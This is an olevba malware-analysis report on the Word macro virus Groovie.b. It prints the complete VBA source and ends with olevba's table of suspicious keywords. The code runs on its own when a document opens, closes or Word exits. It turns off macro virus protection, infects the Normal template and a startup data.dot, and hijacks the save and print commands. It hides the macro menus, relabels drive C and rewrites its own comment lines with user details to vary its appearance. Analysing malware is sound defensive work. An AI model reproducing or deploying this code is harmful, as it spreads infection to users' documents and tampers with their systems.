olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Groovie.b-d589e56a9f2bbe142544c33f00dafb69df2619f9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Groovie.b-d589e56a9f2bbe142544c33f00dafb69df2619f9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO groovie.bas 
in file: Virus.MSWord.Groovie.b-d589e56a9f2bbe142544c33f00dafb69df2619f9 - OLE stream: 'Macros/VBA/groovie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Public I02 As Boolean
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Public I03 As Boolean
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Public I04 As Boolean
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Public I05 As Boolean
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Public I06 As String
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Public I07 As Boolean
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Public I08 As Boolean
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Function I09()
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
On Error Resume Next
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    If MacroContainer = NormalTemplate Then
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        I01 = "normal"
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        GoTo checkout
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    End If
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    If MacroContainer = ActiveDocument Then I01 = "document"
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    If MacroContainer = "data.dot" Then I01 = "orbit"
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
checkout:
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
End Function
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Function I10()
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
On Error Resume Next
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        If ActiveDocument.VBProject.VBComponents(i).Name = "groovie" Then I04 = True
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    Next i
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        If NormalTemplate.VBProject.VBComponents(i).Name = "groovie" Then I03 = True
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    Next i
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
End Function
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Function I11()
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
On Error Resume Next
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Call I09
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Call I10
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    If I01 = "document" Then Call I12
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    If I01 = "normal" Then Call I13
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    If I01 = "orbit" Then Call I14
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
End Function
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Function I12()
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
On Error Resume Next
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    If I03 = False And I05 = False Then
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        With NormalTemplate.VBProject
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        With .VBComponents.Import("c:\groovie.sys")
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        End With
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        End With
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    End If
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    If I02 = False Then
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        If I08 = False Then Documents.Open FileName:=I06
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        Shell ("label c: groovie"), 0
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        Windows(1).Close
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    End If
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
End Function
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Function I13()
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
On Error Resume Next
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Application.ScreenUpdating = False
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    Call I17
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    If I04 = False And I07 = True Then
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        With ActiveDocument.VBProject
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        With .VBComponents.Import("c:\groovie.sys")
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        End With
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        End With
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        With Dialogs(wdDialogFileSummaryInfo)
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
            .Comments = "ALT-F11 says it's groovie!"
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
            .Execute
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        End With
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    End If
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    If I02 = False And I07 = True Then
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        If I08 = False Then Documents.Open FileName:=I06
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    End If
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    If I02 = False And I07 = False Then
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        Documents.Add Template:="", NewTemplate:=False
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    End If
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Application.ScreenUpdating = True
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
End Function
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Function I14()
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
On Error Resume Next
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Application.ScreenUpdating = False
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        If I03 = False And I05 = False Then
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
            With NormalTemplate.VBProject
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
            With .VBComponents.Import("c:\groovie.sys")
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
            End With
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
            End With
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
            NormalTemplate.Save
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        End If
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        If I04 = False Then
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
            With ActiveDocument.VBProject
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
            With .VBComponents.Import("c:\groovie.sys")
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
            End With
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
            End With
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
            With Dialogs(wdDialogFileSummaryInfo)
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
                .Comments = "ALT-F11 says it's groovie!"
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
                .Execute
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
            End With
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        End If
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Application.ScreenUpdating = True
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
End Function
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Function I15()
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
On Error Resume Next
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    Options.VirusProtection = False
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    Options.SaveNormalPrompt = False
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    Options.ConfirmConversions = False
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    I06 = ActiveDocument.FullName
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    Call I11
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
End Function
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Sub AutoOpen()
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
On Error Resume Next
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Call I15
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
End Sub
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Sub AutoClose()
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
On Error Resume Next
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
I08 = True
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Call I15
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
End Sub
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Sub AutoExit()
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
On Error Resume Next
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Call I15
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
End Sub
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Sub FileSaveAs()
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
On Error Resume Next
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Call I16
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Call I15
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Dialogs(wdDialogFileSaveAs).Show
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
End Sub
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Sub filesave()
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
On Error Resume Next
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Call I16
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Call I15
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
End Sub
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Sub fileclose()
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
On Error Resume Next
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
I08 = True
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Call I15
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
ActiveDocument.Close
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
End Sub
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Sub fileprint()
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
On Error Resume Next
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Call I15
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Dialogs(wdDialogFilePrint).Show
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
End Sub
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Sub ViewVBCode()
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
End Sub
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Sub ToolsMacro()
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
End Sub
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Sub FileTemplates()
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
End Sub
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Function I17()
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
On Error GoTo docek
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    If ActiveDocument.Name <> "" Then
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
        I07 = True
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    End If
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    GoTo over
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
docek:
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
    I07 = False
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
over:
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
End Function
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Function I16()
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Randomize
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
rn = Int(Rnd * 999)
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
With Application.VBE.ActiveVBProject.VBComponents("Groovie").codemodule
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
For x = 2 To 358 Step 2
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
.deletelines x
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & Application.UserAddress & rn & Application.ActivePrinter
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
Next x
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
End With
 ' TB25/04/03 14:19:29653Trevor Browne653Brother HL-1660 series on LPT1:
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+
